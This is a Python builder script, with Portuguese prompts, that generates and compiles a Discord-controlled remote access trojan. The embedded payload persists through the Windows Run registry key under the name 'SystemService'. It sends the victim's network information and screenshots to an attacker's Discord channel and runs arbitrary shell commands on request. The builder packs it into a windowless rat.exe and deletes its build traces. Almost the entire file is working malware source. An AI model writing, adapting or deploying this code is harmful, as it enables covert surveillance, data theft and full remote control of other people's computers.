import os
import sys
import time
import subprocess
import shutil

def build_rat():
    print("="*50)
    print("RAT BUILDER (Remote Access Tool)")
    print("="*50)
    
    print("""
INSTRUÇÕES:
1. Acesse discord.com/developers/applications
2. Clique em "New Application"
3. Dê um nome ao bot
4. Vá para a seção Bot
5. Clique em "Reset Token" e copie o token
6. Ative as intents:
   - Presence Intent
   - Server Members Intent
   - Message Content Intent
7. Vá para OAuth2 > URL Generator
8. Selecione "bot" e permissões "Administrator"
9. Use a URL gerada para convidar o bot
""")
    
    token = input("Digite o Token do seu Bot: ").strip()
    
    if len(token) < 50:
        print("Token inválido!")
        return
    
    rat_script = f'''
import discord
import asyncio
import os
import subprocess
import requests
from PIL import ImageGrab
import tempfile
import sys

try:
    import winreg
    HAS_WINREG = True
except ImportError:
    HAS_WINREG = False

TOKEN = "{token}"

def add_to_startup():
    if os.name != "nt" or not HAS_WINREG:
        return
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception:
        pass

add_to_startup()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Bot conectado como {{client.user}}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    content = message.content.strip()
    content_lower = content.lower()
    local_username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"

    if content_lower == "!help":
        embed = discord.Embed(
            title="RAT Commands",
            description=(
                "**!help** - Show commands\\n"
                "**!clients** - Show infected clients\\n"
                "**!ip <username>** - Get IP info\\n"
                "**!screenshot <username>** - Take screenshot\\n"
                "**!cmd <username> <command>** - Execute command"
            ),
            color=discord.Color.blue()
        )
        await message.channel.send(embed=embed)

    elif content_lower == "!clients":
        await message.channel.send(f"Client: `{{local_username}}`")

    elif content_lower.startswith("!ip"):
        parts = content.split()
        if len(parts) < 2:
            await message.channel.send("Usage: `!ip <username>`")
            return

        requested = parts[1]
        if requested.lower() != local_username.lower():
            await message.channel.send(f"Client '{{requested}}' not found")
            return

        try:
            ipconfig = subprocess.check_output("ipconfig /all", shell=True, text=True, timeout=5)
        except Exception as e:
            ipconfig = f"Error: {{e}}"

        try:
            res = requests.get("https://ipinfo.io/json", timeout=5)
            ipinfo = "\\n".join([f"{{k}}: {{v}}" for k,v in res.json().items()]) if res.status_code == 200 else "Failed"
        except:
            ipinfo = "Failed"

        embed = discord.Embed(
            title=f"IP Info - {{local_username}}",
            description=f"**IPCONFIG:**\\n```{{ipconfig[:1000]}}```\\n**IPINFO:**\\n```{{ipinfo[:500]}}```",
            color=discord.Color.blue()
        )
        await message.channel.send(embed=embed)

    elif content_lower.startswith("!screenshot"):
        parts = content.split()
        if len(parts) < 2:
            await message.channel.send("Usage: `!screenshot <username>`")
            return

        requested = parts[1]
        if requested.lower() != local_username.lower():
            await message.channel.send(f"Client '{{requested}}' not found")
            return

        try:
            screenshot = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
                screenshot.save(tmp.name)

            embed = discord.Embed(title=f"Screenshot - {{local_username}}", color=discord.Color.blue())
            embed.set_image(url="attachment://screenshot.png")

            with open(tmp.name, "rb") as img:
                await message.channel.send(embed=embed, file=discord.File(img, filename="screenshot.png"))

            os.remove(tmp.name)
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")

    elif content_lower.startswith("!cmd"):
        parts = content.split()
        if len(parts) < 3:
            await message.channel.send("Usage: `!cmd <username> <command>`")
            return

        requested = parts[1]
        if requested.lower() != local_username.lower():
            await message.channel.send(f"Client '{{requested}}' not found")
            return

        cmd = " ".join(parts[2:])
        try:
            output = subprocess.check_output(cmd, shell=True, text=True, timeout=10)
            if not output.strip():
                output = "(No output)"
            if len(output) > 1500:
                output = output[:1500] + "\\n...[truncated]"
        except Exception as e:
            output = f"Error: {{e}}"

        embed = discord.Embed(
            title=f"Command Output - {{local_username}}",
            description=f"```{{output}}```",
            color=discord.Color.blue()
        )
        await message.channel.send(embed=embed)

client.run(TOKEN)
'''

    script_path = "rat.py"
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(rat_script)
    
    print("Compilando RAT...")
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--noconfirm", script_path], check=True)
        
        downloads = os.path.join(os.path.expanduser("~"), "Downloads")
        final_path = os.path.join(downloads, "rat.exe")
        
        if os.path.exists(os.path.join("dist", "rat.exe")):
            shutil.move(os.path.join("dist", "rat.exe"), final_path)
            print(f"RAT criado: {final_path}")
            print("\nComandos do RAT:")
            print("  !help - Mostrar ajuda")
            print("  !clients - Ver clientes")
            print("  !ip <user> - Informações IP")
            print("  !screenshot <user> - Capturar tela")
            print("  !cmd <user> <cmd> - Executar comando")
    except Exception as e:
        print(f"Erro: {e}")
    
    # Limpeza
    for folder in ["build", "dist", "__pycache__"]:
        shutil.rmtree(folder, ignore_errors=True)
    for file in ["rat.py", "rat.spec"]:
        os.remove(file)

if __name__ == "__main__":
    build_rat()